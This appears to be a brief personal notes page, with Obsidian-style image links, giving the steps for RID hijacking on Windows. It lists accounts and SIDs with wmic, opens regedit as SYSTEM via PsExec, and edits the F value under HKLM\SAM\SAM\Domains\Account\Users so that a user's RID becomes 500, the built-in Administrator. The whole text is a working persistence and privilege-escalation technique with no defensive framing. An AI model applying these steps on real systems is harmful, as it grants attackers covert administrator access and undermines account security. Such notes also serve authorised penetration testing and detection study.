```CMD
wmic useraccount get name,sid
```

```CMD
PsExec64.exe -i -s regedit
```

1. Go to HKLM\SAM\SAM\Domains\Account\Users\
2. Open the users folder, and then open the F key
3. Convert the current user RID to Hex (1010 = 0x3F2)

![[RID_registry1.png]]
5. Change the RID to 500 (500 = 0x01F4) (little-endian)

![[RID-registry2.png]]
